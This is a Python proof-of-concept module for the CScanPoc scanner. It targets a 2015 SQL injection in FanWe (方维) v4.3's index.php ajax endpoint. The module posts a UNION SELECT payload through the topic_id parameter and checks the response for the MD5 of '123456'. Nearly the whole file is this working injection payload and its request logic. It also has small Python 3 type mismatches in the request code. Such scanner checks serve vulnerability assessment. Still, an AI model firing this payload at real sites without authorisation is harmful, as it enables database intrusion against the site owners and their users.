# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'FanWe_0001'  # 平台漏洞编号，留空
    name = '方维O2O商业系统 index.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-25'  # 漏洞公布时间
    desc = '''
        方维团购 v4.3 /index.php?ctl=ajax&act=load_topic_reply_list，topic_id造成了注入。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0122585'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FanWe(方维)'  # 漏洞应用名称
    product_version = 'v4.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2a1bcebd-9ed3-4898-9b67-6436ca18b4bb'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:http://wooyun.org/bugs/wooyun-2015-0122585
            verify_url = self.target + "/index.php?ctl=ajax&act=load_topic_reply_list"
            post_data = 'topic_id=-1%20union%20select%0b1,2,3,md5(123456),5,6,7,8,9%23'

            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req, post_data).read()
            if 'e10adc3949ba59abbe56e057f20f883e' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
